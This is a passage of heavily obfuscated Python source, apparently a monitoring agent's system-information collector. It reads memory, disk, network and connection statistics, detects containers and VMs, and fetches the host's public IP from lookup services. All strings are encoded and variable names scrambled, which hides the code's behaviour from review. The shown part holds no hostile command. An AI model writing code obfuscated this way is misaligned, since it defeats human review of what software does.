        if os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0075\\u0073\\u0061\\u0067\\u0065\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')) and os.path.exists(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape')):
            try:
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0075\\u0073\\u0061\\u0067\\u0065\\u005f\\u0069\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_160:
                    O0_var_161 = int(O0_var_160.read().strip())
                O0_var_165 = 0
                with open(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0066\\u0073\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002f\\u006d\\u0065\\u006d\\u006f\\u0072\\u0079\\u002e\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_160:
                    for O0_var_163 in O0_var_160:
                        O0_var_164 = O0_var_163.strip().split()
                        if len(O0_var_164) == 2 and O0_var_164[0] == codecs.decode('\\u0063\\u0061\\u0063\\u0068\\u0065', 'unicode_escape'):
                            O0_var_165 = int(O0_var_164[1])
                            break
                return max(0, O0_var_161 - O0_var_165)
            except (OSError, ValueError):
                pass
        return psutil.virtual_memory().used

    async def _get_memory_info(self) -> Dict[str, int]:
        try:
            O0_var_166 = self._get_container_mem_limit()
            O0_var_167 = self._get_container_mem_usage()
            O0_var_168 = psutil.swap_memory()
            return {codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_166, codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_167, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_168.total, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_168.used}
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u5185\\u5b58\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 2)
            return {codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0061\\u006d\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0077\\u0061\\u0070\\u005f\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    def _get_physical_disk_device(self, O0_var_169: str) -> Optional[str]:
        if platform.system() != codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape'):
            return O0_var_169
        import re
        O0_var_170 = O0_var_169.replace(codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape'), codecs.decode('', 'unicode_escape'))
        if not O0_var_170:
            return None
        if re.match(codecs.decode('\\u005e\\u005b\\u0061\\u002d\\u007a\\u0041\\u002d\\u005a\\u0030\\u002d\\u0039\\u005c\\u002e\\u005c\\u002d\\u005f\\u005d\\u002b\\u003a', 'unicode_escape'), O0_var_170) or O0_var_170.startswith(codecs.decode('\\u002f\\u002f', 'unicode_escape')):
            return O0_var_169
        O0_var_171 = [codecs.decode('\\u005e\\u0028\\u006d\\u0064\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0029\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0073\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u0078\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0029\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u006d\\u006d\\u0063\\u0062\\u006c\\u006b\\u005c\\u0064\\u002b\\u0029\\u0070\\u003f\\u005c\\u0064\\u002a\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u0028\\u006e\\u0076\\u006d\\u0065\\u005c\\u0064\\u002b\\u006e\\u005c\\u0064\\u002b\\u0029\\u0070\\u003f\\u005c\\u0064\\u002a\\u0024', 'unicode_escape')]
        for O0_var_172 in O0_var_171:
            O0_var_173 = re.match(O0_var_172, O0_var_170)
            if O0_var_173:
                return codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_173.group(1))
        if not re.search(codecs.decode('\\u005c\\u0064', 'unicode_escape'), O0_var_170):
            return O0_var_169
        O0_var_174 = codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0062\\u006c\\u006f\\u0063\\u006b\\u002f', 'unicode_escape') + str(O0_var_170)
        if os.path.exists(O0_var_174):
            O0_var_175 = os.path.realpath(os.path.dirname(O0_var_174))
            O0_var_176 = os.path.realpath(O0_var_174)
            if not os.path.isdir(O0_var_176):
                O0_var_177 = os.path.dirname(O0_var_175)
                if O0_var_177.endswith(codecs.decode('\\u002f\\u0073\\u0079\\u0073\\u002f\\u0062\\u006c\\u006f\\u0063\\u006b', 'unicode_escape')):
                    O0_var_178 = os.path.basename(O0_var_175)
                    if self._is_physical_disk(codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_178)):
                        return codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f', 'unicode_escape') + str(O0_var_178)
        return None

    def _get_container_disk_info(self) -> Dict[str, int]:
        try:
            O0_var_179 = psutil.disk_usage(codecs.decode('\\u002f', 'unicode_escape'))
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): int(O0_var_179.total), codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): int(O0_var_179.used)}
        except Exception as e:
            Logger.debug(codecs.decode('\\u005b\\u5bb9\\u5668\\u6a21\\u5f0f\\u005d\\u0020\\u83b7\\u53d6\\u78c1\\u76d8\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 5)
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    async def _get_host_disk_info(self) -> Dict[str, int]:
        try:
            O0_var_180 = 0
            O0_var_181 = 0
            O0_var_182 = set()
            O0_var_183 = psutil.disk_partitions(all=True)
            for O0_var_184 in O0_var_183:
                O0_var_185 = O0_var_184.device
                O0_var_186 = O0_var_184.mountpoint
                O0_var_187 = O0_var_184.fstype
                if O0_var_187 in {codecs.decode('\\u0074\\u006d\\u0070\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0076\\u0074\\u006d\\u0070\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u006f\\u0076\\u0065\\u0072\\u006c\\u0061\\u0079', 'unicode_escape'), codecs.decode('\\u0073\\u0071\\u0075\\u0061\\u0073\\u0068\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0070\\u0072\\u006f\\u0063', 'unicode_escape'), codecs.decode('\\u0073\\u0079\\u0073\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape'), codecs.decode('\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070\\u0032', 'unicode_escape'), codecs.decode('\\u0070\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), codecs.decode('\\u0062\\u0070\\u0066', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u0063\\u0065\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079\\u0066\\u0073', 'unicode_escape'), codecs.decode('\\u0065\\u0066\\u0069\\u0076\\u0061\\u0072\\u0066\\u0073', 'unicode_escape')}:
                    continue
                O0_var_188 = self._get_physical_disk_device(O0_var_185)
                if not O0_var_188 or O0_var_188 in O0_var_182:
                    continue
                if not self._is_physical_disk(O0_var_188):
                    continue
                try:
                    O0_var_189 = psutil.disk_usage(O0_var_186)
                    O0_var_180 += O0_var_189.total
                    O0_var_181 += O0_var_189.used
                    O0_var_182.add(O0_var_188)
                except (PermissionError, OSError):
                    continue
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_180, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): O0_var_181}
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u78c1\\u76d8\\u4fe1\\u606f\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 5)
            return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}

    async def _get_disk_info(self) -> Dict[str, int]:
        if self._get_virtualization() in [codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u004c\\u0078\\u0063', 'unicode_escape'), codecs.decode('\\u0050\\u006f\\u0064\\u006d\\u0061\\u006e', 'unicode_escape')]:
            return self._get_container_disk_info()
        return await self._get_host_disk_info()

    async def _get_disk_total(self) -> int:
        O0_var_190 = await self._get_disk_info()
        return O0_var_190[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape')]

    def _is_physical_disk(self, O0_var_191: str) -> bool:
        if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
            return any((O0_var_191.lower().startswith(O0_var_192) for O0_var_192 in [codecs.decode('\\u0063\\u003a', 'unicode_escape'), codecs.decode('\\u0064\\u003a', 'unicode_escape'), codecs.decode('\\u0065\\u003a', 'unicode_escape'), codecs.decode('\\u0066\\u003a', 'unicode_escape'), codecs.decode('\\u0067\\u003a', 'unicode_escape'), codecs.decode('\\u0068\\u003a', 'unicode_escape')]))
        import re
        if re.match(codecs.decode('\\u005e\\u005b\\u0061\\u002d\\u007a\\u0041\\u002d\\u005a\\u0030\\u002d\\u0039\\u005c\\u002e\\u005c\\u002d\\u005f\\u005d\\u002b\\u003a', 'unicode_escape'), O0_var_191) or O0_var_191.startswith(codecs.decode('\\u002f\\u002f', 'unicode_escape')):
            return True
        O0_var_193 = [codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0073\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u0078\\u0076\\u0064\\u005b\\u0061\\u002d\\u007a\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006e\\u0076\\u006d\\u0065\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u006e\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006d\\u006d\\u0063\\u0062\\u006c\\u006b\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u002f\\u0064\\u0065\\u0076\\u002f\\u006d\\u0064\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b\\u0024', 'unicode_escape'), codecs.decode('\\u005e\\u007a\\u0072\\u006f\\u006f\\u0074\\u002f\\u002e\\u002a\\u0024', 'unicode_escape')]
        return any((re.match(O0_var_194, O0_var_191) for O0_var_194 in O0_var_193))

    async def _get_network_stats(self) -> Dict[str, int]:
        try:
            O0_var_195 = psutil.net_io_counters(pernic=True)
            O0_var_196 = time.time()
            O0_var_197 = 0
            O0_var_198 = 0
            O0_var_199 = [codecs.decode('\\u006c\\u006f', 'unicode_escape'), codecs.decode('\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0062\\u0072\\u002d', 'unicode_escape'), codecs.decode('\\u0074\\u0075\\u006e', 'unicode_escape'), codecs.decode('\\u0076\\u0069\\u0072\\u0062\\u0072', 'unicode_escape')]
            for O0_var_200, O0_var_201 in O0_var_195.items():
                if any((O0_var_202 in O0_var_200 for O0_var_202 in O0_var_199)):
                    continue
                O0_var_197 += O0_var_201.bytes_recv
                O0_var_198 += O0_var_201.bytes_sent
            if SystemInfoCollector._last_network_stats[codecs.decode('\\u0072\\u0078', 'unicode_escape')] == 0:
                SystemInfoCollector._total_network_down = O0_var_197
                SystemInfoCollector._total_network_up = O0_var_198
                SystemInfoCollector._last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): O0_var_197, codecs.decode('\\u0074\\u0078', 'unicode_escape'): O0_var_198}
                SystemInfoCollector._last_network_time = O0_var_196
                return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): SystemInfoCollector._total_network_up, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): SystemInfoCollector._total_network_down}
            O0_var_203 = O0_var_196 - SystemInfoCollector._last_network_time
            O0_var_204 = 0
            O0_var_205 = 0
            if O0_var_203 > 0:
                O0_var_205 = (O0_var_197 - SystemInfoCollector._last_network_stats[codecs.decode('\\u0072\\u0078', 'unicode_escape')]) / O0_var_203
                O0_var_204 = (O0_var_198 - SystemInfoCollector._last_network_stats[codecs.decode('\\u0074\\u0078', 'unicode_escape')]) / O0_var_203
                O0_var_205 = max(0, O0_var_205)
                O0_var_204 = max(0, O0_var_204)
                SystemInfoCollector._total_network_down = O0_var_197
                SystemInfoCollector._total_network_up = O0_var_198
            SystemInfoCollector._last_network_stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): O0_var_197, codecs.decode('\\u0074\\u0078', 'unicode_escape'): O0_var_198}
            SystemInfoCollector._last_network_time = O0_var_196
            return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): int(O0_var_204), codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): int(O0_var_205), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): SystemInfoCollector._total_network_up, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): SystemInfoCollector._total_network_down}
        except Exception as e:
            Logger.debug(codecs.decode('\\u0070\\u0073\\u0075\\u0074\\u0069\\u006c\\u0020\\u6309\\u7f51\\u5361\\u7edf\\u8ba1\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 4)
            return {codecs.decode('\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0075\\u0070', 'unicode_escape'): 0, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 0}

    async def _get_tcp_connections(self) -> int:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                O0_var_206 = subprocess.run([codecs.decode('\\u006e\\u0065\\u0074\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u006e', 'unicode_escape'), codecs.decode('\\u002d\\u0070', 'unicode_escape'), codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape')], capture_output=True, text=True, timeout=5)
                return len([O0_var_207 for O0_var_207 in O0_var_206.stdout.split(codecs.decode('\\u000a', 'unicode_escape')) if codecs.decode('\\u0045\\u0053\\u0054\\u0041\\u0042\\u004c\\u0049\\u0053\\u0048\\u0045\\u0044', 'unicode_escape') in O0_var_207])
            O0_var_208 = psutil.net_connections(kind=codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'))
            return len([O0_var_209 for O0_var_209 in O0_var_208 if O0_var_209.status == codecs.decode('\\u0045\\u0053\\u0054\\u0041\\u0042\\u004c\\u0049\\u0053\\u0048\\u0045\\u0044', 'unicode_escape')])
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0054\\u0043\\u0050\\u8fde\\u63a5\\u6570\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 2)
            return 0

    async def _get_udp_connections(self) -> int:
        try:
            if platform.system() == codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073', 'unicode_escape'):
                O0_var_210 = subprocess.run([codecs.decode('\\u006e\\u0065\\u0074\\u0073\\u0074\\u0061\\u0074', 'unicode_escape'), codecs.decode('\\u002d\\u006e', 'unicode_escape'), codecs.decode('\\u002d\\u0070', 'unicode_escape'), codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape')], capture_output=True, text=True, timeout=5)
                return len([O0_var_211 for O0_var_211 in O0_var_210.stdout.split(codecs.decode('\\u000a', 'unicode_escape')) if codecs.decode('\\u0055\\u0044\\u0050', 'unicode_escape') in O0_var_211 and O0_var_211.strip()])
            return len(psutil.net_connections(kind=codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape')))
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u0055\\u0044\\u0050\\u8fde\\u63a5\\u6570\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e), 2)
            return 0

    def _get_linux_distribution(self) -> Dict[str, str]:
        try:
            if platform.system() == codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape') and os.path.exists(codecs.decode('\\u002f\\u0065\\u0074\\u0063\\u002f\\u006f\\u0073\\u002d\\u0072\\u0065\\u006c\\u0065\\u0061\\u0073\\u0065', 'unicode_escape')):
                with open(codecs.decode('\\u002f\\u0065\\u0074\\u0063\\u002f\\u006f\\u0073\\u002d\\u0072\\u0065\\u006c\\u0065\\u0061\\u0073\\u0065', 'unicode_escape'), codecs.decode('\\u0072', 'unicode_escape')) as O0_var_212:
                    O0_var_213 = O0_var_212.read()
                O0_var_214, O0_var_215 = (codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'), codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'))
                for O0_var_216 in O0_var_213.split(codecs.decode('\\u000a', 'unicode_escape')):
                    if O0_var_216.startswith(codecs.decode('\\u0049\\u0044\\u003d', 'unicode_escape')):
                        O0_var_214 = O0_var_216.replace(codecs.decode('\\u0049\\u0044\\u003d', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
                    elif O0_var_216.startswith(codecs.decode('\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e\\u005f\\u0049\\u0044\\u003d', 'unicode_escape')):
                        O0_var_215 = O0_var_216.replace(codecs.decode('\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e\\u005f\\u0049\\u0044\\u003d', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
                return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_214, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_215}
        except Exception:
            pass
        return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')}

    def _get_virtualization(self) -> str:

        def try_read(O0_var_217: str) -> str:
            try:
                if os.path.exists(O0_var_217):
                    with open(O0_var_217, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0069\\u0067\\u006e\\u006f\\u0072\\u0065', 'unicode_escape')) as O0_var_218:
                        return O0_var_218.read()
            except Exception:
                pass
            return codecs.decode('', 'unicode_escape')
        if platform.system() != codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape'):
            return codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')
        try:
            if os.path.exists(codecs.decode('\\u002f\\u002f\\u002e\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape')):
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            if os.path.exists(codecs.decode('\\u002f\\u0072\\u0075\\u006e\\u002f\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape')):
                return codecs.decode('\\u0050\\u006f\\u0064\\u006d\\u0061\\u006e', 'unicode_escape')
            O0_var_219 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0031\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape')).lower()
            if codecs.decode('\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape') in O0_var_219 or codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0064', 'unicode_escape') in O0_var_219:
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            elif codecs.decode('\\u006b\\u0075\\u0062\\u0065\\u0070\\u006f\\u0064\\u0073', 'unicode_escape') in O0_var_219:
                return codecs.decode('\\u004b\\u0075\\u0062\\u0065\\u0072\\u006e\\u0065\\u0074\\u0065\\u0073', 'unicode_escape')
            elif codecs.decode('\\u006c\\u0078\\u0063', 'unicode_escape') in O0_var_219:
                return codecs.decode('\\u004c\\u0058\\u0043', 'unicode_escape')
            O0_var_219 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0073\\u0065\\u006c\\u0066\\u002f\\u006d\\u006f\\u0075\\u006e\\u0074\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'))
            if codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072\\u002f\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0073\\u002f', 'unicode_escape') in O0_var_219 or codecs.decode('\\u0077\\u006f\\u0072\\u006b\\u0064\\u0069\\u0072\\u003d\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u0069\\u0062\\u002f\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape') in O0_var_219:
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            elif codecs.decode('\\u002f\\u0070\\u006f\\u0064\\u0073\\u002f', 'unicode_escape') in O0_var_219 or codecs.decode('\\u006b\\u0075\\u0062\\u0065\\u006c\\u0065\\u0074', 'unicode_escape') in O0_var_219:
                return codecs.decode('\\u004b\\u0075\\u0062\\u0065\\u0072\\u006e\\u0065\\u0074\\u0065\\u0073', 'unicode_escape')
            if codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u003d\\u006c\\u0078\\u0063', 'unicode_escape') in try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0031\\u002f\\u0065\\u006e\\u0076\\u0069\\u0072\\u006f\\u006e', 'unicode_escape')):
                return codecs.decode('\\u004c\\u0058\\u0043', 'unicode_escape')
            O0_var_219 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0063\\u0070\\u0075\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'))
            if codecs.decode('\\u0051\\u0045\\u004d\\u0055', 'unicode_escape') in O0_var_219 or codecs.decode('\\u004b\\u0056\\u004d', 'unicode_escape') in O0_var_219:
                return codecs.decode('\\u0051\\u0045\\u004d\\u0055', 'unicode_escape')
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u865a\\u62df\\u5316\\u4fe1\\u606f\\u5931\\u8d25\\u0028\\u975e\\u81f4\\u547d\\u0029\\u003a\\u0020', 'unicode_escape') + str(e), 1)
        return codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')

    async def _get_public_ip_v4(self) -> Optional[str]:
        O0_var_220 = [codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u002e\\u0069\\u0070\\u0069\\u0066\\u0079\\u002e\\u006f\\u0072\\u0067', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0063\\u0061\\u006e\\u0068\\u0061\\u007a\\u0069\\u0070\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0063\\u0068\\u0065\\u0063\\u006b\\u0069\\u0070\\u002e\\u0061\\u006d\\u0061\\u007a\\u006f\\u006e\\u0061\\u0077\\u0073\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0066\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u002e\\u006d\\u0065\\u002f\\u0069\\u0070', 'unicode_escape')]
        for O0_var_221 in O0_var_220:
            try:
                O0_var_222 = await self._fetch_ip(O0_var_221)
                if O0_var_222 and self._is_valid_ipv4(O0_var_222):
                    return O0_var_222
            except Exception:
                continue
        return None

    async def _get_public_ip_v6(self) -> Optional[str]:
        O0_var_223 = [codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u0036\\u002e\\u0069\\u0070\\u0069\\u0066\\u0079\\u002e\\u006f\\u0072\\u0067', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0063\\u0061\\u006e\\u0068\\u0061\\u007a\\u0069\\u0070\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')]
        for O0_var_224 in O0_var_223:
            try:
                O0_var_225 = await self._fetch_ip(O0_var_224)
                if O0_var_225 and self._is_valid_ipv6(O0_var_225):
                    return O0_var_225
            except Exception:
                continue
        return None

    async def _fetch_ip(self, O0_var_226: str) -> str:
        O0_var_227 = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=O0_var_227) as O0_var_228:
            async with O0_var_228.get(O0_var_226, headers={codecs.decode('\\u0075\\u0073\\u0065\\u0072\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): Config.AGENT_VERSION}) as response:
                if response.status == 200:
                    return (await response.text()).strip()
                raise Exception(codecs.decode('\\u0048\\u0054\\u0054\\u0050\\u0020', 'unicode_escape') + str(response.status))

    def _is_valid_ipv4(self, O0_var_229: str) -> bool:
        try:
            socket.inet_pton(socket.AF_INET, O0_var_229)
            return True
